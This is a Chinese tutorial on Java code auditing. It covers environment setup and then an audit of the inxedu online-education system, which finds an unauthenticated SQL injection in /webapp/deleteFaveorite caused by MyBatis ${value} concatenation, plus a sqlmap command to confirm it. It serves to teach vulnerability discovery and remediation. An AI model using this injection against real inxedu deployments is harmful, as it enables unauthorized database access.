> 原文链接: https://www.anquanke.com//post/id/197641 


# Java代码审计之入门篇（一）


                                阅读量   
                                **1006649**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">7</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01ceaf6c86b0caf27c.png)](https://p4.ssl.qhimg.com/t01ceaf6c86b0caf27c.png)



## 0x1 前言

java代码审计系列是我很早之前就一直在筹备的，但是由于接触JAVA比较少，所以一直在积累各种相关经验，自己也用java写了一些web项目， 熟悉了一些框架的流程，才正式开始记录自己学习java代码审计的过程。



## 0x2 java环境相关的知识

1.JDK(Java Development Kit) 是针对java开发员的产品(SDK)，是整个java的核心。

组成:
- 开发工具位于bin子目录中， 指工具和实用程序，可帮助开发、执行、调试以java编程语言编写的程序，例如，编译器javac.exe 和解释器java.exe都位于该目录中
- java运行环境位于jre子目录中，window安装的时候会提示安装jre其实没必要，因为jdk包括了。 java运行环境包括java虚拟机、类库以及其他支持执行以java编程语言编写的程序的文件。
- 附加库位于lib子目录中， 开发工具所需的其他类库和支持文件
- C头文件
- 源代码
2.JRE(Java Runtime Environment) 是运行java程序所必须的环境集合，包含JVM标准、及java核心类库。<br>
如果我们只是要运行java程序的话其实没必要安装jdk，只需要安装JRE就可以了。

3.JVM(Java Virtual Machine) java虚拟机是整个实现跨平台的最核心部分，能够运行以java语言编写的软件程序。

他们三者的关系，可以参考这个图

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134884579-0707e3ad-10db-4eff-927d-d6d9c3149f77.png#align=left&amp;display=inline&amp;height=550&amp;originHeight=550&amp;originWidth=992&amp;size=0&amp;status=done&amp;style=none&amp;width=992)

4.java平台

> <ul>
- Java SE(java Platform, Standard Edition) 这是标准版，基础版本。允许开发和部署在桌面、服务器、嵌入式环境和实时环境中使用的 Java 应用程序。Java SE 包含了支持 Java Web 服务开发的类。 通常拿来开发java的桌面软件
- Java EE (Java Platform，Enterprise Edition): Java EE 是在Java SE的基础上构建的，他提供Web服务、组件模型、管理、通信API,用来实现企业级的面向服务体系结构和web2.0应用程序。
- Java ME(Java Platform, Micro Edition): 为在移动设备和嵌入式设备(比如手机、PDA、 电视机顶盒和打印机) 上运行的运用程序提供一个健壮且灵活的环境
</ul>

5.java服务器

(1) 常见的Java服务器: Tomcat 、 Weblogic、Jetty、JBoss、GlassFish等。

(2)Tomcat简介:

免费的开放源代码的web应用服务器，属于轻量级应用服务器，在中小型系统和并发访问等很多的场合下被普遍使用，是开发和调试JSP程序的首选。

6.项目管理和构建工具Maven

Maven是一种自动构建项目的方式，可以帮助我们自动从本地和远程仓库拉取关联的jar包



## 0x3 MAC下安装java环境

### <a class="reference-link" name="0x3.1%20%E5%AE%89%E8%A3%85MYSQL%E5%8F%8A%E5%85%B6%E9%A9%B1%E5%8A%A8%E5%8C%85"></a>0x3.1 安装MYSQL及其驱动包

这个mac自带安装了MYSQL，所以我们只要安装对应的mysql的java驱动程序，放在tomcat的lib目录下就可以。

或者放在`WEB-INF`下的lib目录下也可以，具体看我后面的操作

因为我的mysql是`5.7.21 Homebrew` 所以我们需要用到5.x的jdbc

[Connector/J 5.1.48](https://dev.mysql.com/downloads/connector/j/5.1.html)

登陆注册之后

[访问下载](https://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.48.zip)

### <a class="reference-link" name="0x3.2%20%E5%AE%89%E8%A3%85Tomcat"></a>0x3.2 安装Tomcat

首先去官网下载最新版Tomcat9,[offical download](https://tomcat.apache.org/download-90.cgi)

改名放在`~/Library/Apachetomcat9`

```
xq17@localhost  ~/Library/ApacheTomcat9  tree -L 1
.
├── BUILDING.txt
├── CONTRIBUTING.md
├── LICENSE
├── NOTICE
├── README.md
├── RELEASE-NOTES
├── RUNNING.txt //上面是使用文档和版权声明
├── bin //存放tomcat命令
├── conf // 存放tomcat配置信息，里面的server.xml是核心的配置文件
├── lib //支持tomcat软件运行的jar包和技术支持包(如servlet 和 jsp)
├── logs //运行时的日志信息
├── temp //临时目录
├── webapps //共享资源文件和web应用目录
└── work //tomcat的运行目录，jsp运行时产生的临时文件就存放在这里
```

我们修改下默认的启动端口,8080 改成9090，避免与我本地burp冲突

`/conf/server.xml`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134884567-71b436cd-b92e-4207-af55-a91f39c45cb9.png#align=left&amp;display=inline&amp;height=300&amp;originHeight=300&amp;originWidth=1584&amp;size=0&amp;status=done&amp;style=none&amp;width=1584)

处于安全性考虑，我们也需要配置下密码 `tomcat` `tomcat`

`conf/tomcat-user.xml`中`&lt;/tomcat-users&gt;`上面加入如下代码

```
&lt;role rolename="manager-gui"/&gt;
&lt;user username="tomcat" password="tomcat" roles="manager-gui"/&gt;
---
```

去`/conf/bin`目录进行安装

```
chmod u+x *.sh
./startup.sh
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134884762-84fdbeb5-221f-4565-8dbc-965c14bff07e.png#align=left&amp;display=inline&amp;height=850&amp;originHeight=850&amp;originWidth=2968&amp;size=0&amp;status=done&amp;style=none&amp;width=2968)

### <a class="reference-link" name="0x3.3%20%E5%AE%89%E8%A3%85IDE"></a>0x3.3 安装IDE

为了方便调试，我安装了两个IDE，一个是eclipse(集成环境方便开发) 一个是idea(方便动态调试)

首先要配置最基础的java开发和运行环境就需要 安装jdk的8.0(一般习惯叫jdk 1.8) 通常也可以说是java8,

hombrew 安装教程 可以参考这篇文章，比较简单，我就不赘述了。

[Mac OS 安装java指定版本](https://www.jianshu.com/p/6289bd0bb69c)

#### <a class="reference-link" name="0x3.3.1%20%E5%AE%89%E8%A3%85eclipse"></a>0x3.3.1 安装eclipse

这个可以直接去官网下载:

[download.**eclipse**.org](http://www.baidu.com/link?url=tMBavDmVu7xcxa56F-Fq1eg5iCGOyMtAOkYlvmLKOObnlIyaI4M7UPc0vtxdkdUB)

然后选择development for jee那个package来安装就行了。

#### <a class="reference-link" name="0x3.3.2%20%E5%AE%89%E8%A3%85IDEA"></a>0x3.3.2 安装IDEA

参考这篇安装文章: [Mac 安装idea以及激活方法](https://blog.csdn.net/u014266077/article/details/80616471)

下面就需要配置下IDE的运行程序了。

eclipse 的话直接修改Tomcat Server 为我们安装的Tomcat就可以了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134884564-d7b0bbf4-09d8-460c-bef2-8d06a2fdef3b.png#align=left&amp;display=inline&amp;height=980&amp;originHeight=980&amp;originWidth=1184&amp;size=0&amp;status=done&amp;style=none&amp;width=1184)

Idea因为不是集成环境，所以我们需要用到第三方插件

按需要安装

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134885118-84cedbe7-abaf-4f10-838d-f06f0955b52f.png#align=left&amp;display=inline&amp;height=1258&amp;originHeight=1258&amp;originWidth=1684&amp;size=0&amp;status=done&amp;style=none&amp;width=1684)



## 0x4 小试牛刀之尝试部署项目

这里参考了国科社区师傅用的 [javapms-1.4-beta.zip](http://download.javapms.com/pgdowload.jsp)

(1) 直接安装

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134884778-1c018e50-3289-4653-b73e-e7e350152118.png#align=left&amp;display=inline&amp;height=478&amp;originHeight=478&amp;originWidth=1290&amp;size=0&amp;status=done&amp;style=none&amp;width=1290)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134885026-e58f2a96-2a3a-4cb0-b770-742dae979757.png#align=left&amp;display=inline&amp;height=454&amp;originHeight=454&amp;originWidth=1828&amp;size=0&amp;status=done&amp;style=none&amp;width=1828)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134884968-09c13081-0558-41c1-8d91-1822949950f6.png#align=left&amp;display=inline&amp;height=792&amp;originHeight=792&amp;originWidth=1908&amp;size=0&amp;status=done&amp;style=none&amp;width=1908)

(2) IDEA 部署

我们选择`import Project`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134884773-9aacb1bf-d516-45a6-90fa-1c80bd050dd7.png#align=left&amp;display=inline&amp;height=464&amp;originHeight=464&amp;originWidth=1412&amp;size=0&amp;status=done&amp;style=none&amp;width=1412)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134885025-54747690-b409-468f-83f6-bdd18df9151a.png#align=left&amp;display=inline&amp;height=402&amp;originHeight=402&amp;originWidth=1432&amp;size=0&amp;status=done&amp;style=none&amp;width=1432)

然后一路默认下去就行了,打开项目之后，我们配置下运行程序Tomcat

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134884794-af99bfd2-3203-435b-bedc-c1cb763fa388.png#align=left&amp;display=inline&amp;height=1336&amp;originHeight=1336&amp;originWidth=2198&amp;size=0&amp;status=done&amp;style=none&amp;width=2198)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134885091-1f63556e-4214-4bda-9e2c-59c5c2b6102b.png#align=left&amp;display=inline&amp;height=1176&amp;originHeight=1176&amp;originWidth=2106&amp;size=0&amp;status=done&amp;style=none&amp;width=2106)

尝试下idea强大的反编译class及其调试功能

先运行安装下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134884806-bf357538-1567-4d02-9868-15f0f757ce14.png#align=left&amp;display=inline&amp;height=1058&amp;originHeight=1058&amp;originWidth=1992&amp;size=0&amp;status=done&amp;style=none&amp;width=1992)

随便选一个action打一个断点就行了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134884764-de67404e-d4e8-477e-b89e-651096982758.png#align=left&amp;display=inline&amp;height=1250&amp;originHeight=1250&amp;originWidth=1980&amp;size=0&amp;status=done&amp;style=none&amp;width=1980)

> <p>下面是几个调试中会用到的几个快捷键：<br>
●F7 ，进入下一步，如果当前断点是一个方法，进入方法体。<br>
●F8 ，进入下一步，但不会进入方法体内。<br>
●Alt+Shift+F7 ， 进入下一步，如果当前断点是一个方法，方法还有方法则循环进入。<br>
●Shift+F8 ，跳出到下一个断点，也可以按F9来实现。<br>
●Drop Frame ，当进入一个方法体想回退到方法体外可以使用该键。<br>
我很少用快捷键，一般用鼠标就行了，或者mac上的bar就行了。不过F9我用的比较多。</p>



## 0x5 崭露头角之因酷教育在线漏洞挖掘

这个系统我印象是比较深刻, 因为之前在那个湖湘杯的登顶赛中一方面没下载下来源码, 另外一方面自己对java的项目不熟悉所以当时做了标记，所以这次就以这个为例,顺便聊一下登顶赛维持权限的技巧。

### <a class="reference-link" name="0x5.1%20%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B"></a>0x5.1 安装过程

inxedu 因酷教育软件v2.0.6

源码:[http://down.admin5.com/jsp/132874.html](http://down.admin5.com/jsp/132874.html)

有个安装目录详细记录了使用教程和idea的教程。

这里简单记录下:

1.执行`mysql&gt; source ./demo_inxedu_v2_0_open.sql`

2.idea导入项目直接`import projects`,默认下去即可,等待自动解决maven依赖,可能有点慢。

3.数据库配置

修改下数据库配置

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134979983-7d1c8e63-3724-4d68-9521-4b03f6e87950.png#align=left&amp;display=inline&amp;height=542&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=542&amp;originWidth=1324&amp;size=75927&amp;status=done&amp;style=none&amp;width=1324)

4.配置Tomcat

`Run--&gt;Edit Configurations`-&gt;Maven

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.nlark.com/yuque/0/2020/png/376067/1580134993947-2d2598f2-17db-47f9-ba5e-4e8bfb6e67fc.png#align=left&amp;display=inline&amp;height=442&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=442&amp;originWidth=1378&amp;size=54730&amp;status=done&amp;style=none&amp;width=1378)

点击`Run`,等待安装完成即可。

```
前台http://127.0.0.1:82/ 
测试账号：demo@inxedu.com 111111
后台 http://127.0.0.1:82/admin 
测试账号：admin 111111
```

### <a class="reference-link" name="0x5.2%20%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"></a>0x5.2 前置知识

这些内容我简要提取一些关键点出来。

1.目录结构分析

```
├── java //核心代码区
│   └── com
├── resources //资源目录,存放一些配置文件
│   └── mybatis //SQL 文件描述XML
└── webapp //就是类似/var/www/html存放一些静态文件内容
    ├── WEB-INF 
    ├── images
    ├── kindeditor
    └── static
```

这里重点讲下`WEB-INF`目录

> <p>WEB-INF是用来存储服务端配置文件信息和在服务端运行的类文件的，它下面的东西不允许客户端直接访问的。<br>
一般会有`web.xml`文件(WEB项目配置文件)<br>
通过文件读取该文件我们可以获取到这个项目的架构和配置信息(编码、过滤器、监听器…)</p>

2.了解SpringMVC架构工作流程

> <p>1.用户发起请求-&gt;SPring MVC 前端控制器(DispathcerServlet)-&gt;处理器映射器(HandlerMapping)进行处理-&gt;根据URL选择对应的Controller<br>
2.控制器(Controller)执行相应处理逻辑,执行完毕,Return 返回值。<br>
3.`ViewResolver`解析控制器返回值-&gt;前端控制器(DispathcerSevlet)去解析-&gt;View对象<br>
4.前端控制器(DispathcerSevlet)对View进行渲染,返回至客户端浏览器,完成请求交互</p>

3.Mybaits

> Mybatis 数据持久化框架,可以实现将应用程序的对象持久化到关系型数据库中,但是需要我们手动编写SQL语句

使用方式: 基于**XML配置**,将SQL语句与JAVA代码分离

容易出现的安全问题主要是在于:

在XML配置中,描述参数使用不当会导致SQL注入

```
1.#`{``}` 预编译处理参数
2.$`{``}`    直接拼接sql语句
```

后面分析SQL注入的时候我会详细分析下这个框架的实现过程。

### <a class="reference-link" name="0x5.3%20%E5%BC%80%E5%A7%8B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%97%85"></a>0x5.3 开始代码审计之旅

时间充裕，我们采取通读的审计方式， 对于框架而言，我一般是先阅读权限控制模块，然后直接通读Controller模块,然后跟踪看看, 后面你会发现很多类似的代码，从而提高通读的速度的。

#### <a class="reference-link" name="0x5.3.1%20%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B"></a>0x5.3.1 权限控制流程

通过阅读`web.xml`

```
&lt;servlet-mapping&gt;
        &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/&lt;/url-pattern&gt;

    &lt;/servlet-mapping&gt;
```

可以看到这里Spring MVC前置拦截器采用的是`/`规则,也就是拦截所以不带后缀的请求,而`/*`是拦截所有请求。

我们继续跟进看下有没有自定义的控制拦截,我们读下`Spring mvc`配置文件

`/src/main/resources/spring-mvc.xml`

```
&lt;mvc:interceptors&gt;
         &lt;!-- 后台登录和权限的拦截器配置 --&gt;
         &lt;mvc:interceptor&gt;
             &lt;mvc:mapping path="/admin/*"/&gt;
             &lt;mvc:mapping path="/admin/**/*"/&gt;
             &lt;mvc:exclude-mapping path="/admin/main/login"/&gt;
             &lt;bean class="com.inxedu.os.common.intercepter.IntercepterAdmin"&gt;&lt;/bean&gt;
         &lt;/mvc:interceptor&gt;
         &lt;!-- 前台网站配置拦截器配置 --&gt;
         &lt;mvc:interceptor&gt;
             &lt;mvc:mapping path="/**/*"/&gt;
             &lt;mvc:exclude-mapping path="/static/**/*"/&gt;
             &lt;mvc:exclude-mapping path="/*/ajax/**"/&gt;
             &lt;mvc:exclude-mapping path="/kindeditor/**/*"/&gt;
             &lt;bean class="com.inxedu.os.common.intercepter.LimitIntercepterForWebsite"&gt;
             &lt;/bean&gt;
         &lt;/mvc:interceptor&gt;
         &lt;!-- 前台用户登录拦截器配置 --&gt;
         &lt;mvc:interceptor&gt;
             &lt;mvc:mapping path="/uc/*"/&gt;
             &lt;mvc:mapping path="/uc/**/*"/&gt;
             &lt;mvc:exclude-mapping path="/uc/tologin"/&gt;
             &lt;mvc:exclude-mapping path="/uc/getloginUser"/&gt;
             &lt;mvc:exclude-mapping path="/uc/register"/&gt;
             &lt;mvc:exclude-mapping path="/uc/createuser"/&gt;
             &lt;mvc:exclude-mapping path="/uc/login"/&gt;
             &lt;mvc:exclude-mapping path="/uc/passwordRecovery"/&gt;
             &lt;mvc:exclude-mapping path="/uc/sendEmail"/&gt;
             &lt;bean class="com.inxedu.os.common.intercepter.IntercepterWebLogin"&gt;
             &lt;/bean&gt;
         &lt;/mvc:interceptor&gt;
```

好家伙,我们跟进相关的类,看下拦截的流程。

`com.inxedu.os.common.intercepter.IntercepterAdmin`

```
public boolean preHandle(HttpServletRequest request,
            HttpServletResponse response, Object handler) throws Exception `{`
        //获取登录的用户
        SysUser sysUser = SingletonLoginUtils.getLoginSysUser(request);
        if(sysUser==null)`{`
            response.sendRedirect("/admin");//跳转登录页面
            return false;
        `}`
        //访问的路径
        String invokeUrl = request.getContextPath() + request.getServletPath();
        //获取所有的权限
        List&lt;SysFunction&gt; allFunctionList = (List&lt;SysFunction&gt;) EHCacheUtil.get(CacheConstans.SYS_ALL_USER_FUNCTION_PREFIX+sysUser.getUserId());
        if(ObjectUtils.isNull(allFunctionList))`{`
            allFunctionList = sysFunctionService.queryAllSysFunction();
            EHCacheUtil.set(CacheConstans.SYS_ALL_USER_FUNCTION_PREFIX+sysUser.getUserId(),allFunctionList);
        `}`
        //判断当前访问的权限，是否在限制中
        boolean hasFunction = false;
        for(SysFunction sf : allFunctionList)`{`
            if(sf.getFunctionUrl()!=null &amp;&amp; sf.getFunctionUrl().trim().length()&gt;0 &amp;&amp; invokeUrl.indexOf(sf.getFunctionUrl())!=-1)`{`
                hasFunction = true;
            `}`
        `}`
        //如果当前访问的权限不在限制中,直接允许通过
        if(!hasFunction)`{`
            return true;
        `}`
        //如果当前访问的权限在限制中则判断是否有访问权限
        List&lt;SysFunction&gt; userFunctionList = (List&lt;SysFunction&gt;) EHCacheUtil.get(CacheConstans.USER_FUNCTION_PREFIX+sysUser.getUserId());
        if(userFunctionList==null || userFunctionList.size()==0)`{`
            userFunctionList = sysFunctionService.querySysUserFunction(sysUser.getUserId());
            EHCacheUtil.set(CacheConstans.USER_FUNCTION_PREFIX+sysUser.getUserId(), userFunctionList);
        `}`
        boolean flag = false;
        if(ObjectUtils.isNotNull(userFunctionList))`{`
            for(SysFunction usf : userFunctionList)`{`
                //如果用户有访问权限
                if(invokeUrl.indexOf(usf.getFunctionUrl())!=-1 &amp;&amp; usf.getFunctionUrl()!=null &amp;&amp; usf.getFunctionUrl().trim().length()&gt;0)`{`
                    flag=true;
                    break;
                `}`
            `}`
        `}`
```

继续跟进下:`SingletonLoginUtils.getLoginSysUser`

```
public static SysUser getLoginSysUser(HttpServletRequest request) `{`
        String userKey = WebUtils.getCookie(request, CacheConstans.LOGIN_MEMCACHE_PREFIX);
        if (StringUtils.isNotEmpty(userKey)) `{`
            SysUser sysUser = (SysUser) EHCacheUtil.get(userKey);
            if (ObjectUtils.isNotNull(sysUser)) `{`
                return sysUser;
            `}`
        `}`
        return null;
    `}`
```

这里获取了Cookie的值解析出了`userKey`,至于这个可不可以伪造,我们跟下来源

`/src/main/java/com/inxedu/os/edu/controller/main/LoginController.java`

```
@RequestMapping("/main/login")
    public ModelAndView login(HttpServletRequest request,HttpServletResponse response,@ModelAttribute("sysUser") SysUser sysUser)`{`
...............
    request.getSession().removeAttribute(CommonConstants.RAND_CODE);
            sysUser.setLoginPwd(MD5.getMD5(sysUser.getLoginPwd()));
            SysUser su = sysUserService.queryLoginUser(sysUser);
            if(su==null)`{`
                model.addObject("message", "用户名或密码错误！");
                return model;
            `}`
            //判断用户是否是可用状态
            if(su.getStatus()!=0)`{`
                model.addObject("message", "该用户已经冻结！");
                return model;
            `}`
            //缓存用登录信息
            EHCacheUtil.set(CacheConstans.LOGIN_MEMCACHE_PREFIX+su.getUserId(), su);
            //request.getSession().setAttribute(CacheConstans.LOGIN_MEMCACHE_PREFIX+su.getUserId(),su );
            WebUtils.setCookie(response, CacheConstans.LOGIN_MEMCACHE_PREFIX, CacheConstans.LOGIN_MEMCACHE_PREFIX+su.getUserId(), 1);

            //修改用户登录记录
            sysUserService.updateUserLoginLog(su.getUserId(), new Date(), WebUtils.getIpAddr(request));

            //添加登录记录
            SysUserLoginLog loginLog = new SysUserLoginLog();
            loginLog.setUserId(su.getUserId());//用户ID
            loginLog.setLoginTime(new Date());//
            loginLog.setIp(WebUtils.getIpAddr(request));//登录IP
            String userAgent = WebUtils.getUserAgent(request);
            if(StringUtils.isNotEmpty(userAgent))`{`
                loginLog.setUserAgent(userAgent.split(";")[0]);//浏览器
                loginLog.setOsName(userAgent.split(";")[1]);//操作系统
            `}`
            //保存登录日志
            sysUserLoginLogService.createLoginLog(loginLog);
            model.setViewName(loginSuccess);
        `}`catch (Exception e) `{`
            model.addObject("message", "系统繁忙，请稍后再操作！");
            logger.error("login()--error",e);
        `}`
        return model;
    `}`
`}`
```

这里可以看到登陆信息是经过数据库对比判断后缓存在服务端，并且在服务端验证的，除非加密算法可逆，要不然就没办法越权，这个后面可以细跟,鉴于文章篇幅，这里不做探讨。

#### <a class="reference-link" name="0x5.3.2%20%E5%89%8D%E5%8F%B0%E5%8A%9F%E8%83%BD%E5%AE%A1%E8%AE%A1"></a>0x5.3.2 前台功能审计

上面我们排除了简单的越权可能性, 所以我们可以集中精力围绕在前台功能点。

**前台SQL注入挖掘思路**

这套系统采用的是Mybatis框架

[Java Mybatis框架入门教程](http://c.biancheng.net/mybatis/)

`src/main/java/com/inxedu/os/app/controller/user/AppUserController.java`

```
@Controller
@RequestMapping("/webapp")
public class AppUserController extends BaseController`{`
..........
@RequestMapping("/deleteFaveorite")
    @ResponseBody
    public Map&lt;String, Object&gt; deleteFavorite(HttpServletRequest request)`{`
        Map&lt;String, Object&gt; json=new HashMap&lt;String, Object&gt;();
        try`{`
            String id=request.getParameter("id");
            if(id==null||id.trim().equals(""))`{`
                json=setJson(false, "id不能为空", null);
                return json;
            `}`
            courseFavoritesService.deleteCourseFavoritesById(id);
            json=setJson(true, "取消收藏成功", null);
        `}`catch (Exception e) `{`
            json=setJson(false, "异常", null);
            logger.error("deleteFavorite()---error",e);
        `}`
        return json;
    `}`
  ....................
`}`
```

这个主类入口是`webapp`,所以我们访问`/webapp/deleteFaveorite`,就能访问到该控制器,`/webapp` 并没有拦截器处理,所以我们可以直接不带cookie访问。

可以看到直接获取了id值,然后进入了`courseFavoritesService.deleteCourseFavoritesById(id)`

我们继续跟进:`deleteCourseFavoritesById`

`src/main/java/com/inxedu/os/edu/dao/impl/course/CourseFavoritesDaoImpl.java`

```
package com.inxedu.os.edu.dao.impl.course;

import java.util.List;
import java.util.Map;

import org.springframework.stereotype.Repository;

import com.inxedu.os.common.dao.GenericDaoImpl;
import com.inxedu.os.common.entity.PageEntity;
import com.inxedu.os.edu.dao.course.CourseFavoritesDao;
import com.inxedu.os.edu.entity.course.CourseFavorites;
import com.inxedu.os.edu.entity.course.FavouriteCourseDTO;

/**
 *
 * CourseFavorites
 * @author www.inxedu.com
 */
 @Repository("courseFavoritesDao")
public class CourseFavoritesDaoImpl extends GenericDaoImpl implements CourseFavoritesDao `{`



    public void deleteCourseFavoritesById(String ids) `{`
        this.delete("CourseFavoritesMapper.deleteCourseFavoritesById", ids);
    // 这里就会寻找CourseFavoritesMapper.deleteCourseFavoritesById
    // 对应的XML文件
    // course/CourseFavoritesMapper.xml 中对应的
    // deleteCourseFavoritesById 自定义语句
    `}`


    public int checkFavorites(Map&lt;String, Object&gt; map) `{`
        return this.selectOne("CourseFavoritesMapper.checkFavorites", map);
    `}`


    public List&lt;FavouriteCourseDTO&gt; queryFavoritesPage(int userId, PageEntity page) `{`
        return this.queryForListPage("CourseFavoritesMapper.queryFavoritesPage", userId, page);
    `}`


`}`
```

`src/main/resources/mybatis/inxedu/course/CourseFavoritesMapper.xml`

```
&lt;!-- 删除收藏 --&gt;
    &lt;delete id="deleteCourseFavoritesById" parameterType="String"&gt;
    DELETE FROM EDU_COURSE_FAVORITES WHERE ID  IN  ($`{`value`}`)
    &lt;/delete&gt;
```

我们可以看到这里拼接值是`String`类型,`$`{`value`}``采取的是直接拼接SQL语句的方法,至于为什么不采取#`{``}`拼接方式, 因为这里想拼接的是数字类型，而`#`{``}``拼接方式默认都会两边带上`''`,其实解决方案就是自己可以再加一层数字判断即可。

我们可以直接采取SQLMAP来验证,然后check一下控制台执行的SQL就可以二次确认了。

`sqlmap -u "http://127.0.0.1:82//webapp/deleteFaveorite?id=1*"`

